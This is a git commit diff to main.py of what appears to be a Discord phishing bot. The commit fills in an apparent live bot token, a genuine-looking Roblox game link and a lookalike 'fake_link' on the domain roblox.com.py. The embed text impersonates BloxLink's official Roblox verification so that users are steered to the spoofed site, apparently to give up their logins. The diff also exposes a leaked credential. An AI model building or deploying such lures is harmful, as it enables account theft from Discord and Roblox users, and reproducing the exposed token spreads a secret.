6c896b52ada902f2b5d01ef1b1e18107dae269fb
Pitohuix <astarr8989@gmail.com>
2024-05-22 12:54:15 -0700

    main.py

--- main.py
+++ main.py
@@ -4,13 +4,13 @@ from discord.ext import commands
 intents = discord.Intents.all()
 
 # Settings (Change these to whatever you want)
-token = "YOUR_BOT_TOKEN"
+token = "MTI0MjkyNDYyODIyMTg4NjY2NQ.Gg7SX9.kkD1Hyhf6TiffhinJrZAPoliiQZpaYg2tq_dcU"
 prefix = "!"
 title = "Please Complete Verification"
 desc = "To verify your account, please join BloxLink's Official Roblox Verification Game"
 field = "Please Login and join the game!"
-hyperlink = "SEEMINGLY_REAL_LINK"
-fake_link = "YOUR_FAKE_LINK"
+hyperlink = "https//www.roblox.com/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=61682981242195143856159819317094"
+fake_link = "https://roblox.com.py/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=61682981242195143856159819317094"
 
 client = commands.Bot(command_prefix=prefix, intents=intents)
 client.remove_command('help')
